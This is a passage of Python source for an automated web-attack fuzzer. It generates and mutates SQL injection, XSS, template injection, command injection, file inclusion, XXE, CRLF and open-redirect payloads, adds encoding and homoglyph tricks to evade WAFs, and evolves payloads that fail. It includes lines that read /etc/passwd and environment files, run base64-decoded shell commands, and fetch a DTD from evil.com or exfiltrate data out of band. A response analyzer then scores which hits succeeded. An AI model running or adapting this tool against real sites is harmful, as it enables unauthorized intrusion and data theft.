        return f"{ws}{s}{ws}"

    def _mut_char_encoding(self, s):
        result = []
        for c in s:
            r = random.random()
            if r < 0.2:
                result.append(f"&#x{ord(c):x};")
            elif r < 0.4:
                result.append(f"%{ord(c):02x}")
            elif r < 0.5:
                result.append(f"\\x{ord(c):02x}")
            else:
                result.append(c)
        return "".join(result)

    def _mut_string_concat(self, s):
        if len(s) < 4:
            return s
        mid = len(s) // 2
        method = random.choice(["plus", "concat", "join"])
        if method == "plus":
            return f"'{s[:mid]}'+'{s[mid:]}'"
        elif method == "concat":
            return f"CONCAT('{s[:mid]}','{s[mid:]}')"
        else:
            return f"['{s[:mid]}','{s[mid:]}'].join('')"

    def _mut_null_byte_append(self, s):
        nulls = ["%00", "\\0", "\\x00", "\x00"]
        return s + random.choice(nulls)

    def _mut_unicode_normalize(self, s):
        replacements = {
            '/': ['⁄', '∕', '／'],
            '<': ['＜', '‹', '〈'],
            '>': ['＞', '›', '〉'],
            '"': ['＂', '"', '"'],
            "'": ["＇", "'", "'"],
            '&': ['＆', '﹠'],
        }
        result = list(s)
        for i, c in enumerate(result):
            if c in replacements and random.random() < 0.3:
                result[i] = random.choice(replacements[c])
        return "".join(result)

    def _mut_double_encoding(self, s):
        return self._enc_double_url(s)

    def _mut_html_entity_mix(self, s):
        return self._enc_html_entity(s)

    def _mut_nested_encoding(self, s):
        depth = random.randint(2, 3)
        result = s
        for _ in range(depth):
            method = random.choice([self._enc_url, self._enc_html_entity, self._enc_hex])
            result = method(result)
        return result

    def _mut_keyword_split(self, s):
        keywords = ["SELECT", "UNION", "script", "alert", "onerror", "onload"]
        for kw in keywords:
            if kw.lower() in s.lower():
                split_point = random.randint(1, len(kw)-1)
                separator = random.choice(["/**/", "/*!*/", "/**x**/", "\t"])
                replacement = f"{kw[:split_point]}{separator}{kw[split_point:]}"
                s = re.sub(re.escape(kw), replacement, s, count=1, flags=re.I)
        return s

    def _mut_alternative_syntax(self, s):
        replacements = {
            "alert(": ["alert`", "alert.call(null,", "window['alert'](",
                       "self['alert'](", "top['alert']("],
            "SELECT": ["SELECT ALL", "SELECT DISTINCT", "SELECT TOP 1"],
            "OR ": ["|| ", "OR/**/ ", "OR/*!*/ "],
            "AND ": ["&& ", "AND/**/ ", "AND/*!*/ "],
        }
        for old, alternatives in replacements.items():
            if old.lower() in s.lower():
                s = re.sub(re.escape(old), random.choice(alternatives), s, count=1, flags=re.I)
        return s

    def _mut_homoglyph(self, s):
        homoglyphs = {
            'a': ['а', 'ɑ', 'α'], 'e': ['е', 'έ', 'ε'],
            'o': ['о', 'ό', 'ο'], 'i': ['і', 'ί', 'ι'],
            'c': ['с', 'ς'], 'p': ['р'],
        }
        result = list(s)
        for i, c in enumerate(result):
            if c.lower() in homoglyphs and random.random() < 0.2:
                result[i] = random.choice(homoglyphs[c.lower()])
        return "".join(result)

    def _mut_backslash_escape(self, s):
        result = []
        for c in s:
            if random.random() < 0.2 and c.isalpha():
                result.append(f"\\{c}")
            else:
                result.append(c)
        return "".join(result)

    def _mut_newline_injection(self, s):
        newlines = ["\n", "\r\n", "%0a", "%0d%0a"]
        nl = random.choice(newlines)
        # Insert newline at random position
        if len(s) > 5:
            pos = random.randint(2, len(s)-2)
            return s[:pos] + nl + s[pos:]
        return s

    def _mut_tab_separation(self, s):
        tabs = ["\t", "%09", "%0b"]
        tab = random.choice(tabs)
        return s.replace(" ", tab) if " " in s else f"{tab}{s}{tab}"

    def _mut_block_comment_wrap(self, s):
        padding = random.choice(["x" * 10, "a" * 20, "0" * 15])
        return f"/*{padding}*/{s}/*{padding}*/"

    def _mut_inline_comment_split(self, s):
        # Split at spaces with inline comments
        return s.replace(" ", random.choice(["/**/", "/*!*/", "/**/"]))

    def _mut_recursive_encode(self, s):
        # Apply URL encoding to specific characters only
        target_chars = random.sample("'\"<>();", min(3, len("'\"<>();")))
        result = list(s)
        for i, c in enumerate(result):
            if c in target_chars:
                result[i] = f"%{ord(c):02x}"
        return "".join(result)

    def _mut_zero_width_insert(self, s):
        # Insert zero-width characters (invisible)
        zw_chars = ["\u200b", "\u200c", "\u200d", "\ufeff", "\u2060"]
        result = list(s)
        for i in range(len(result)):
            if random.random() < 0.15:
                result.insert(i, random.choice(zw_chars))
        return "".join(result)

    def _pick(self, key: str):
        return self.rng.choice(self.ATOMS[key])

    # ---- Payload Builders (Enhanced) ----
    def _build_sqli(self, length_tier: str) -> Tuple[str, str]:
        strategies = [
            "error_based", "union_based", "time_based", "boolean_based",
            "stacked_query", "second_order", "out_of_band", "inline_comment",
            "case_variation", "encoding_bypass", "nested_subquery",
            "having_group", "order_by_probe", "limit_offset",
            "between_like", "rlike_regexp", "procedure_analyse"
        ]
        strat = self.rng.choice(strategies)

        q = self._pick("sql_string_break")
        c = self._pick("sql_comment")
        ws = self._pick("whitespace")

        if strat == "error_based":
            logic = self._pick("sql_logic")
            if length_tier in ["short"]:
                return f"{q}{ws}{logic}{ws}1=1{c}", strat
            elif length_tier == "long":
                return (f"{q}{ws}{logic}{ws}(SELECT{ws}1{ws}FROM{ws}(SELECT{ws}"
                        f"COUNT(*),CONCAT(0x{(self.rng.randbytes(4).hex() if hasattr(self.rng, 'randbytes') else 'deadbeef')},"
                        f"FLOOR(RAND(0)*2))x{ws}FROM{ws}information_schema.tables{ws}"
                        f"GROUP{ws}BY{ws}x)a){c}"), strat
            elif length_tier == "super_long":
                func = self.rng.choice(["extractvalue", "updatexml", "geometrycollection"])
                return (f"{q}{ws}AND{ws}{func}(1,CONCAT(0x7e,(SELECT{ws}"
                        f"GROUP_CONCAT(table_name){ws}FROM{ws}information_schema.tables{ws}"
                        f"WHERE{ws}table_schema=database(){ws}LIMIT{ws}0,1),0x7e)){c}"), strat
            else:  # ultra_long
                return (f"{q}{ws}AND{ws}(SELECT{ws}1{ws}FROM{ws}(SELECT{ws}"
                        f"COUNT(*),CONCAT((SELECT{ws}GROUP_CONCAT(column_name{ws}SEPARATOR{ws}0x3a){ws}"
                        f"FROM{ws}information_schema.columns{ws}WHERE{ws}table_schema=database(){ws}"
                        f"LIMIT{ws}0,5),FLOOR(RAND(0)*2))x{ws}FROM{ws}"
                        f"information_schema.tables{ws}GROUP{ws}BY{ws}x)a){c}"), strat

        elif strat == "union_based":
            cols = self.rng.randint(1, 10)
            nulls = ",".join(["NULL"] * cols)
            if length_tier in ["short"]:
                return f"{q}{ws}UNION{ws}SELECT{ws}{nulls}{c}", strat
            elif length_tier == "long":
                return (f"{q}{ws}UNION{ws}ALL{ws}SELECT{ws}{nulls},CONCAT(0x7e,VERSION(),0x7e),"
                        f"{nulls}{ws}FROM{ws}information_schema.tables{c}"), strat
            else:
                return (f"{q}{ws}UNION{ws}ALL{ws}SELECT{ws}{nulls},CONCAT(0x7e,(SELECT{ws}"
                        f"GROUP_CONCAT(schema_name){ws}FROM{ws}information_schema.schemata),0x7e),"
                        f"{nulls}{ws}FROM{ws}information_schema.tables{ws}LIMIT{ws}0,1{c}"), strat

        elif strat == "time_based":
            delay = self.rng.choice([3, 5, 7, 10])
            methods = [
                f"{q};{ws}WAITFOR{ws}DELAY{ws}'0:0:{delay}'{c}",
                f"{q}{ws}AND{ws}SLEEP({delay}){c}",
                f"{q}{ws}AND{ws}(SELECT{ws}*{ws}FROM{ws}(SELECT(SLEEP({delay})))a){c}",
                f"{q};{ws}SELECT{ws}BENCHMARK(10000000,MD5(0x{(self.rng.randbytes(2).hex() if hasattr(self.rng, 'randbytes') else 'dead')})){c}",
                f"{q}{ws}AND{ws}IF(1=1,SLEEP({delay}),0){c}",
                f"{q}{ws}OR{ws}SLEEP({delay}){c}",
                f"1{ws}AND{ws}(SELECT{ws}*{ws}FROM{ws}(SELECT(SLEEP({delay})))abc){c}",
            ]
            return self.rng.choice(methods), strat

        elif strat == "boolean_based":
            methods = [
                f"{q}{ws}AND{ws}1=1",
                f"{q}{ws}AND{ws}1=2",
                f"{q}{ws}OR{ws}1=1{c}",
                f"{q}{ws}OR{ws}1=2{c}",
                f"{q}{ws}AND{ws}SUBSTRING(@@version,1,1)='5'",
                f"{q}{ws}AND{ws}ASCII(SUBSTRING((SELECT{ws}database()),1,1))>64",
                f"{q}{ws}AND{ws}(SELECT{ws}COUNT(*){ws}FROM{ws}information_schema.tables)>0",
                f"1{ws}AND{ws}LENGTH(database())>{self.rng.randint(1,20)}",
            ]
            return self.rng.choice(methods), strat

        elif strat == "stacked_query":
            return f"{q};{ws}SELECT{ws}{self.rng.randint(1,999)}{c}", strat

        elif strat == "second_order":
            return f"{q};{ws}INSERT{ws}INTO{ws}logs{ws}VALUES('{q}){c}", strat

        elif strat == "out_of_band":
            domain = f"{self.rng.randint(1000,9999)}.burp.me"
            return f"{q};{ws}SELECT{ws}LOAD_FILE(CONCAT('\\\\\\\\',(SELECT{ws}version()),'.{domain}\\\\a')){c}", strat

        elif strat == "inline_comment":
            return f"{q}/*!50000{ws}AND{ws}1=1*/{c}", strat

        elif strat == "case_variation":
            base = f"{q} AnD 1=1 {c}"
            return self._mut_case_variation(base), strat

        elif strat == "encoding_bypass":
            base = f"{q} OR 1=1{c}"
            return self._mut_char_encoding(base), strat

        elif strat == "nested_subquery":
            return (f"{q}{ws}AND{ws}(SELECT{ws}1{ws}WHERE{ws}(SELECT{ws}1{ws}WHERE{ws}"
                    f"(SELECT{ws}COUNT(*){ws}FROM{ws}information_schema.tables)>0))=1{c}"), strat

        elif strat == "having_group":
            return f"{q}{ws}HAVING{ws}1=1{c}", strat

        elif strat == "order_by_probe":
            col = self.rng.randint(1, 50)
            return f"{q}{ws}ORDER{ws}BY{ws}{col}{c}", strat

        elif strat == "limit_offset":
            return f"{q}{ws}LIMIT{ws}1{ws}OFFSET{ws}0{c}", strat

        elif strat == "between_like":
            return f"{q}{ws}AND{ws}1{ws}BETWEEN{ws}0{ws}AND{ws}2{c}", strat

        elif strat == "rlike_regexp":
            return f"{q}{ws}RLIKE{ws}'^.{self.rng.randint(1,10)}$'{c}", strat

        elif strat == "procedure_analyse":
            return f"{q}{ws}PROCEDURE{ws}ANALYSE(){c}", strat

        return f"{q}{ws}OR{ws}1=1{c}", strat

    def _build_xss(self, length_tier: str) -> Tuple[str, str]:
        strategies = [
            "classic_tag", "event_handler", "svg_animate", "math_xlink",
            "details_open", "iframe_srcdoc", "input_onfocus", "body_onpageshow",
            "marquee_onstart", "video_source", "object_data", "embed_src",
            "mutation_xss", "dom_xss", "polyglot", "template_injection",
            "svg_script", "math_mtext", "noscript_exit", "style_import",
            "xml_external", "svg_use", "foreign_object", "animate_values"
        ]
        strat = self.rng.choice(strategies)

        js = self._pick("xss_js")
        ws = self._pick("whitespace")

        if strat == "classic_tag":
            tag = self._pick("xss_tag")
            event = self._pick("xss_event")
            return f"<{tag}{ws}{event}={js}>", strat

        elif strat == "event_handler":
            ctx_break = self._pick("xss_context_break")
            event = self._pick("xss_event")
            return f"{ctx_break}{event}={js}", strat

        elif strat == "svg_animate":
            return f"<svg><animate onbegin={js} attributeName=x dur=1s>", strat

        elif strat == "math_xlink":
            return f"<math><mtext><table><mglyph><style><!--</style><img title=--&gt;&lt;img src=x onerror={js}&gt;>", strat

        elif strat == "details_open":
            return f"<details open ontoggle={js}>", strat

        elif strat == "iframe_srcdoc":
            encoded_js = self._enc_html_entity(f"<script>{js}</script>")
            return f'<iframe srcdoc="{encoded_js}">', strat

        elif strat == "input_onfocus":
            return f'<input onfocus={js} autofocus>', strat

        elif strat == "body_onpageshow":
            return f'<body onpageshow={js}>', strat

        elif strat == "marquee_onstart":
            return f'<marquee onstart={js}>', strat

        elif strat == "video_source":
            return f'<video><source onerror={js}>', strat

        elif strat == "object_data":
            return f'<object data="javascript:{js}">', strat

        elif strat == "embed_src":
            return f'<embed src="javascript:{js}">', strat

        elif strat == "mutation_xss":
            return f'<noscript><p title="</noscript><img src=x onerror={js}>">', strat

        elif strat == "dom_xss":
            return f'javascript:eval(document.write(decodeURIComponent(location.hash.slice(1))))', strat

        elif strat == "polyglot":
            return (f'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk={js} )'
                    f'//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>'
                    f'\\x3csVg/<sVg/oNloAd={js}/>\\x3e'), strat

        elif strat == "template_injection":
            return f'{{{{constructor.constructor("return this")()}}}}', strat

        elif strat == "svg_script":
            return f"<svg><script>{js}</script></svg>", strat

        elif strat == "math_mtext":
            return f'<math><mtext><img src=x onerror={js}></mtext></math>', strat

        elif strat == "noscript_exit":
            return f'</noscript><img src=x onerror={js}>', strat

        elif strat == "style_import":
            return f'<style>@import "javascript:{js}";</style>', strat

        elif strat == "xml_external":
            return f'<?xml-stylesheet type="text/xsl" href="javascript:{js}"?>', strat

        elif strat == "svg_use":
            return f'<svg><use href="data:image/svg+xml,{self._enc_url(f"<svg xmlns=\'http://www.w3.org/2000/svg\' onload=\'{js}\'/>")}"/>', strat

        elif strat == "foreign_object":
            return f'<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>{js}</script></body></foreignObject></svg>', strat

        elif strat == "animate_values":
            return f'<svg><set attributeName="onmouseover" value="{js}"/>', strat

        return f"<script>{js}</script>", strat

    def _build_ssti(self, length_tier: str) -> Tuple[str, str]:
        strategies = [
            "jinja2_basic", "jinja2_class_chain", "jinja2_config",
            "twig_basic", "twig_filter", "freemarker", "velocity",
            "smarty", "pebble", "thymeleaf", "mako", "django_tpl",
            "angular_expression", "vue_expression", "handlebars",
            "pug_interpolation", "nunjucks", "ejs"
        ]
        strat = self.rng.choice(strategies)

        if strat == "jinja2_basic":
            expr = self._pick("ssti_expr")
            return f"{{{{{expr}}}}}", strat
        elif strat == "jinja2_class_chain":
            return "{{''.__class__.__mro__[1].__subclasses__()}}", strat
        elif strat == "jinja2_config":
            methods = [
                "{{config}}", "{{config.items()}}", "{{self.__dict__}}",
                "{{request.environ}}", "{{lipsum.__globals__}}",
                "{{cycler.__init__.__globals__.os}}",
                "{{namespace.__init__.__globals__['__builtins__']}}"
            ]
            return self.rng.choice(methods), strat
        elif strat == "twig_basic":
            return "{{7*7}}", strat
        elif strat == "twig_filter":
            return "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", strat
        elif strat == "freemarker":
            methods = [
                "${7*7}", "${7*'7'}", "<#assign x='freemarker.template.utility.Execute'?new()>${x('id')}",
                "${.data_model}", "${.globals}"
            ]
            return self.rng.choice(methods), strat
        elif strat == "velocity":
            return "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))$rt", strat
        elif strat == "smarty":
            methods = ["{php}echo `id`;{/php}", "{system('id')}", "{$smarty.version}",
                       "{math equation='7*7'}"]
            return self.rng.choice(methods), strat
        elif strat == "pebble":
            return "{{7*7}}", strat
        elif strat == "thymeleaf":
            return "${7*7}", strat
        elif strat == "mako":
            return "${7*7}", strat
        elif strat == "django_tpl":
            methods = ["{% debug %}", "{% load %}", "{{settings.SECRET_KEY}}",
                       "{% include 'x' %}"]
            return self.rng.choice(methods), strat
        elif strat == "angular_expression":
            return "{{constructor.constructor('return this')()}}", strat
        elif strat == "vue_expression":
            return "{{constructor.constructor('alert(1)')()}}", strat
        elif strat == "handlebars":
            return "{{#with this}}{{/with}}", strat
        elif strat == "pug_interpolation":
            return "#{7*7}", strat
        elif strat == "nunjucks":
            return "{{range.constructor('return this')()}}", strat
        elif strat == "ejs":
            return "<%= 7*7 %>", strat

        return "{{7*7}}", strat

    def _build_cmdi(self, length_tier: str) -> Tuple[str, str]:
        strategies = [
            "semicolon", "pipe", "backtick", "subshell", "newline",
            "ifs_bypass", "variable_bypass", "glob_bypass", "env_chain",
            "base64_exec", "printf_exec", "xargs_exec", "find_exec",
            "while_read", "heredoc", "process_substitution"
        ]
        strat = self.rng.choice(strategies)

        cmd = self._pick("cmd_exec")
        arg = self._pick("cmd_arg")
        sep = self._pick("cmd_sep")

        if strat == "semicolon":
            return f";{cmd} {arg}", strat
        elif strat == "pipe":
            return f"|{cmd} {arg}", strat
        elif strat == "backtick":
            return f"`{cmd} {arg}`", strat
        elif strat == "subshell":
            return f"$({cmd} {arg})", strat
        elif strat == "newline":
            return f"\n{cmd} {arg}\n", strat
        elif strat == "ifs_bypass":
            return f";{cmd}$IFS{arg}", strat
        elif strat == "variable_bypass":
            return f";a={cmd};$a {arg}", strat
        elif strat == "glob_bypass":
            return f";/{cmd[0]}??/{cmd}", strat
        elif strat == "env_chain":
            return f";{cmd} {arg} #", strat
        elif strat == "base64_exec":
            encoded = base64.b64encode(f"{cmd} {arg}".encode()).decode()
            return f";echo {encoded}|base64 -d|sh", strat
        elif strat == "printf_exec":
            return f";$(printf '{cmd}') {arg}", strat
        elif strat == "xargs_exec":
            return f";echo {arg}|xargs {cmd}", strat
        elif strat == "find_exec":
            return f";find / -name '*' -exec {cmd} \\; 2>/dev/null", strat
        elif strat == "while_read":
            return f";echo {arg}|while read x;do {cmd} $x;done", strat
        elif strat == "heredoc":
            return f";{cmd} <<'EOF'\n{arg}\nEOF", strat
        elif strat == "process_substitution":
            return f";{cmd} <({arg})", strat

        return f"{sep}{cmd} {arg}", strat

    def _build_lfi(self, length_tier: str) -> Tuple[str, str]:
        strategies = [
            "basic_traversal", "null_byte", "double_encode", "php_filter",
            "php_input", "php_data", "expect_wrapper", "zip_wrapper",
            "phar_wrapper", "glob_wrapper", "proc_wrapper", "log_poison",
            "session_include", "utf7_encode", "backslash_traverse",
            "mixed_encoding"
        ]
        strat = self.rng.choice(strategies)

        trav = self._pick("path_traversal")
        depth_map = {"short": 3, "long": 5, "super_long": 7, "ultra_long": 10}
        depth = depth_map.get(length_tier, 5)

        if strat == "basic_traversal":
            return trav * depth + "etc/passwd", strat
        elif strat == "null_byte":
            return trav * depth + "etc/passwd%00", strat
        elif strat == "double_encode":
            return self._enc_double_url(trav * depth + "etc/passwd"), strat
        elif strat == "php_filter":
            target = trav * depth + "etc/passwd"
            return f"php://filter/convert.base64-encode/resource={target}", strat
        elif strat == "php_input":
            return "php://input", strat
        elif strat == "php_data":
            return f"data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+", strat
        elif strat == "expect_wrapper":
            return "expect://id", strat
        elif strat == "zip_wrapper":
            return f"zip://{trav*depth}tmp/evil.zip%23shell", strat
        elif strat == "phar_wrapper":
            return f"phar://{trav*depth}tmp/evil.phar/shell", strat
        elif strat == "glob_wrapper":
            return f"glob://{trav*depth}etc/pass*", strat
        elif strat == "proc_wrapper":
            return f"/proc/self/environ", strat
        elif strat == "log_poison":
            return f"{trav*depth}var/log/apache2/access.log", strat
        elif strat == "session_include":
            return f"{trav*depth}tmp/sess_PHPSESSID", strat
        elif strat == "utf7_encode":
            return self._enc_url(trav * depth + "etc/passwd").replace("%2f", "/"), strat
        elif strat == "backslash_traverse":
            return ("..\\" * depth) + "windows\\system32\\drivers\\etc\\hosts", strat
        elif strat == "mixed_encoding":
            base = trav * depth + "etc/passwd"
            return self._enc_mixed(base), strat

        return trav * depth + "etc/passwd", strat

    def _build_xxe(self, length_tier: str) -> Tuple[str, str]:
        strategies = ["classic", "parameter_entity", "blind_oob", "error_based", "xinclude"]
        strat = self.rng.choice(strategies)
        entity = self.rng.choice(["xxe", "foo", "x", "evil", "a"])

        if strat == "classic":
            return (f'<?xml version="1.0"?><!DOCTYPE {entity} ['
                    f'<!ENTITY {entity} SYSTEM "file:///etc/passwd">]>'
                    f'<root>&{entity};</root>'), strat
        elif strat == "parameter_entity":
            return (f'<?xml version="1.0"?><!DOCTYPE {entity} ['
                    f'<!ENTITY % {entity} SYSTEM "file:///etc/passwd">'
                    f'%{entity};]><root/>'), strat
        elif strat == "blind_oob":
            domain = f"{self.rng.randint(1000,9999)}.burp.me"
            return (f'<?xml version="1.0"?><!DOCTYPE {entity} ['
                    f'<!ENTITY % {entity} SYSTEM "http://{domain}/">'
                    f'%{entity};]><root/>'), strat
        elif strat == "error_based":
            return (f'<?xml version="1.0"?><!DOCTYPE {entity} ['
                    f'<!ENTITY % {entity} SYSTEM "file:///etc/passwd">'
                    f'<!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">'
                    f'%dtd;]><root>&{entity};</root>'), strat
        elif strat == "xinclude":
            return f'<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></root>', strat

        return f'<?xml version="1.0"?><!ENTITY {entity} SYSTEM "file:///etc/passwd">', strat

    def _build_crlf(self, length_tier: str) -> Tuple[str, str]:
        strategies = ["basic", "encoded", "unicode", "double_encode", "mixed"]
        strat = self.rng.choice(strategies)
        header = self.rng.choice([
            "Set-Cookie: brut=1",
            "X-Brut: injected",
            "Location: http://evil.com"
        ])

        if strat == "basic":
            return f"%0d%0a{header}%0d%0a", strat
        elif strat == "encoded":
            return f"%0D%0A{self._enc_url(header)}%0D%0A", strat
        elif strat == "unicode":
            return f"\u2028{header}\u2029", strat
        elif strat == "double_encode":
            return self._enc_double_url(f"\r\n{header}\r\n"), strat
        elif strat == "mixed":
            return f"\\r\\n{header}\\r\\n", strat

        return f"%0d%0a{header}", strat

    def _build_redirect(self, length_tier: str) -> Tuple[str, str]:
        strategies = ["basic", "at_sign", "double_slash", "backslash",
                      "unicode_domain", "data_uri", "javascript", "encoded"]
        strat = self.rng.choice(strategies)
        domain = self.rng.choice(["evil.com", "brut.test", "x.test", "attacker.io"])

        if strat == "basic":
            return f"https://{domain}", strat
        elif strat == "at_sign":
            return f"https://legit.com@{domain}", strat
        elif strat == "double_slash":
            return f"//{domain}", strat
        elif strat == "backslash":
            return f"\\\\{domain}", strat
        elif strat == "unicode_domain":
            return f"https://{domain.replace('e', 'е')}", strat  # Cyrillic e
        elif strat == "data_uri":
            return f"data:text/html,<script>alert(1)</script>", strat
        elif strat == "javascript":
            return f"javascript:alert(1)", strat
        elif strat == "encoded":
            return self._enc_url(f"https://{domain}"), strat

        return f"https://{domain}", strat

    def _apply_length_tier(self, payload: str, tier: str) -> str:
        if tier == "short":
            return payload
        elif tier == "long":
            ws = self._pick("whitespace")
            comment = "/**/"
            return f"{ws}{payload}{comment}"
        elif tier == "super_long":
            comment = "/*" + "a" * 50 + "*/"
            padding = self._pick("whitespace") * 3
            return f"{padding}{comment}{payload}{comment}{padding}"
        else:  # ultra_long
            comment = "/*" + "x" * 200 + "*/"
            padding = (self._pick("whitespace") * 5)
            layered = f"{padding}{comment}{padding}{payload}{padding}{comment}{padding}"
            return self._enc_mixed(layered)

    def _apply_mutations(self, payload: str, num_mutations: int = 0) -> str:
        """Apply random mutations to payload."""
        if num_mutations == 0:
            num_mutations = random.randint(0, 3)

        for _ in range(num_mutations):
            technique = random.choice(self.mutation_techniques)
            try:
                payload = technique(payload)
            except Exception:
                continue
        return payload

    def generate(self, count: int) -> List[Dict]:
        """Generate `count` unique payload variants from scratch."""
        builders = {
            "sqli": self._build_sqli,
            "xss": self._build_xss,
            "ssti": self._build_ssti,
            "cmdi": self._build_cmdi,
            "lfi": self._build_lfi,
            "xxe": self._build_xxe,
            "crlf": self._build_crlf,
            "redirect": self._build_redirect,
        }

        tiers = ["short", "long", "super_long", "ultra_long"]
        weights = self.learner.get_adaptive_weights()

        payloads = []
        seen_hashes = set()

        for i in range(count):
            cat = self.rng.choices(self.CATEGORIES, weights=weights, k=1)[0]
            tier = self.rng.choice(tiers)

            # Build from scratch
            builder = builders[cat]
            raw_payload, strategy = builder(tier)

            # Apply length tier
            raw_payload = self._apply_length_tier(raw_payload, tier)

            # Apply mutations (more mutations for longer tiers)
            mut_count = {"short": 0, "long": 1, "super_long": 2, "ultra_long": 3}[tier]
            raw_payload = self._apply_mutations(raw_payload, mut_count)

            # Deduplicate
            payload_hash = hashlib.md5(raw_payload.encode(errors='ignore')).hexdigest()
            if payload_hash in seen_hashes:
                raw_payload += self._pick("whitespace") + str(self.rng.randint(1, 9999))
                payload_hash = hashlib.md5(raw_payload.encode(errors='ignore')).hexdigest()
            seen_hashes.add(payload_hash)

            self.payload_counter += 1

            payloads.append({
                "id": f"BRUT-{self.payload_counter:06d}",
                "payload": raw_payload,
                "category": cat,
                "length_tier": tier,
                "encoding": "raw",
                "strategy": strategy,
                "length": len(raw_payload),
                "hash": payload_hash,
                "built_from_scratch": True,
                "mutations_applied": mut_count,
                "timestamp": datetime.now().isoformat(),
            })

        self.generated_payloads = payloads
        return payloads

    def generate_advanced_batch(self, failed_payloads: List[Dict]) -> List[Dict]:
        """Generate more advanced variants from failed payloads."""
        if not failed_payloads:
            return []

        advanced = []
        for fp in failed_payloads[:15]:
            cat = fp.get("category", "xss")
            builders = {
                "sqli": self._build_sqli, "xss": self._build_xss,
                "ssti": self._build_ssti, "cmdi": self._build_cmdi,
                "lfi": self._build_lfi,
            }
            builder = builders.get(cat, self._build_xss)

            for _ in range(5):
                raw, strategy = builder("ultra_long")
                # Heavy mutations
                raw = self._apply_mutations(raw, 5)
                raw = self._enc_mixed(raw)

                payload_hash = hashlib.md5(raw.encode(errors='ignore')).hexdigest()
                self.payload_counter += 1

                advanced.append({
                    "id": f"BRUT-ADV-{self.payload_counter:06d}",
                    "payload": raw,
                    "category": cat,
                    "length_tier": "ultra_long",
                    "encoding": "mixed_advanced",
                    "strategy": strategy,
                    "length": len(raw),
                    "hash": payload_hash,
                    "built_from_scratch": True,
                    "evolution_from": fp.get("id", ""),
                    "mutations_applied": 5,
                    "timestamp": datetime.now().isoformat(),
                })

        return advanced


# ============================================================
# RESPONSE ANALYZER
# ============================================================
@dataclass
class InjectionResult:
    payload_id: str
    payload: str
    category: str
    parameter: str
    url: str
    method: str
    status_code: int
    response_time_ms: float
    response_size: int
    response_type: str
    evidence: str
    response_snippet: str  # Brief server response
    success: bool
    timestamp: str

    def to_dict(self):
        return asdict(self)


class ResponseAnalyzer:
    SERVER_ERROR_PATTERNS = [
        r"sql\s*syntax", r"mysql", r"oracle", r"postgresql", r"sqlite",
        r"unclosed\s*quotation", r"syntax\s*error.*?(near|at)",
        r"warning.*?mysql", r"pg_query", r"sqlstate",
        r"odbc.*?driver", r"microsoft.*?odbc",
        r"ora-\d+", r"mysql_fetch", r"mysql_num_rows",
        r"sqlite3\.OperationalError", r"psql", r"jdbc",
        r"System\.Data\.OleDb", r"System\.Data\.SqlClient",
        r"fatal\s*error.*?php", r"parse\s*error",
        r"warning.*?on\s+line\s+\d+", r"notice.*?undefined",
        r"call\s+to\s+undefined\s+function",
        r"uncaught\s+(exception|error)",
        r"traceback.*?(most\s+recent|innermost)", r"django",
        r"werkzeug", r"flask", r"python.*?error",
        r"jinja2.*?exception", r"template.*?error",
        r"java\.lang\.", r"at\s+[a-zA-Z]+\.[a-zA-Z]+$",
        r"exception\s+in\s+thread", r"apache\s+tomcat",
        r"javax\.servlet", r"org\.springframework",
        r"asp\.net", r"\.net\s+framework", r"system\.web",
        r"server\s+error\s+in\s+'[^']+'\s+application",
        r"at\s+[a-zA-Z]+\s+$[^)]+$", r"node\.js",
        r"express.*?error", r"referenceerror", r"typeerror",
        r"action\s*controller.*?exception",
        r"rails", r"activerecord", r"nomethoderror",
        r"failed\s+to\s+open\s+stream", r"open_basedir",
        r"permission\s+denied", r"no\s+such\s+file\s+or\s+directory",
        r"file_exists$$", r"fopen$$",
        r"xdebug", r"var_dump", r"print_r", r"debug.*?trace",
        r"stack\s*trace", r"call\s+stack",
    ]

    WAF_BLOCK_PATTERNS = [
        r"blocked\s+by", r"access\s+denied", r"forbidden",
        r"security\s+block", r"request\s+rejected",
        r"suspicious\s+activity", r"malicious\s+request",
        r"incapsula", r"cloudflare", r"akamai",
        r"imperva", r"sucuri", r"mod_security",
        r"403\s+forbidden", r"406\s+not\s+acceptable",
        r"503\s+service\s+unavailable.*?waf",
        r"your\s+request\s+has\s+been\s+blocked",
        r"firewall", r"protected\s+by",
    ]

    LFI_SUCCESS_PATTERNS = [
        r"root:[x*]:0:0:", r"daemon:", r"bin:",
        r"nobody:", r"www-data:",
    ]

    def __init__(self):
        self.server_patterns = [re.compile(p, re.I) for p in self.SERVER_ERROR_PATTERNS]
        self.waf_patterns = [re.compile(p, re.I) for p in self.WAF_BLOCK_PATTERNS]
        self.lfi_patterns = [re.compile(p, re.I) for p in self.LFI_SUCCESS_PATTERNS]

    def analyze(self, response_text: str, status_code: int,
                response_time: float) -> Tuple[str, str, bool, str]:
        """
        Returns: (response_type, evidence, success, response_snippet)
        """
        text = response_text or ""
        snippet = ""

        # 1. WAF block check
        for pattern in self.waf_patterns:
            match = pattern.search(text)
            if match:
                snippet = self._extract_snippet(text, match.start())
                return ("blocked", f"WAF: {match.group(0)[:40]}", False, snippet)

        if status_code in [403, 406, 429, 503]:
            snippet = self._extract_snippet(text, 0)
            return ("blocked", f"Status {status_code}", False, snippet[:80])

        # 2. LFI success
        for pattern in self.lfi_patterns:
            match = pattern.search(text)
            if match:
                snippet = match.group(0)[:60]
                return ("server_output", f"LFI: {snippet}", True, snippet)

        # 3. Server error
        for pattern in self.server_patterns:
            match = pattern.search(text)
            if match:
                evidence = match.group(0)[:80]
                snippet = self._extract_snippet(text, match.start())
                return ("server_output", f"Error: {evidence}", True, snippet)

        # 4. Time-based
        if response_time > 4500:
            return ("server_output", f"Delay: {response_time:.0f}ms", True, f"[Delay {response_time:.0f}ms]")

        # 5. Stack trace
        if re.search(r"(?i)stack\s*trace|call\s*stack|backtrace", text):
            snippet = self._extract_snippet(text, 0)
            return ("server_output", "Stack trace", True, snippet[:80])

        # 6. Default: raw HTML
        snippet = self._extract_snippet(text, 0)
        return ("raw_html", "Normal response", False, snippet[:60])

    def _extract_snippet(self, text: str, pos: int) -> str:
        """Extract a brief meaningful snippet from response."""
        if not text:
